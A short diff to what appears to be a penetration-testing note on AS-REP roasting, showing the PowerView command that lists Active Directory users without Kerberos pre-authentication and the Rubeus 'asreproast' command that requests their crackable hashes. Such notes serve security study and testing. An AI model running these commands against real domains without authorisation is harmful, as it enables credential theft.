@@ -23,7 +23,7 @@ First, we run the PowerView `Get-DomainUser` command with the `-PreauthNotRequir
 ```powershell
 Get-DomainUser -PreauthNotRequired
 ```
-By using use _Rubeus_,[4](https://github.com/GhostPack/Rubeus) (Need To be compile  -> Not done yet)
+By using use _Rubeus_,[4](https://github.com/GhostPack/Rubeus)
 
 ``` powershell
 .\Rubeus.exe asreproast /nowrap
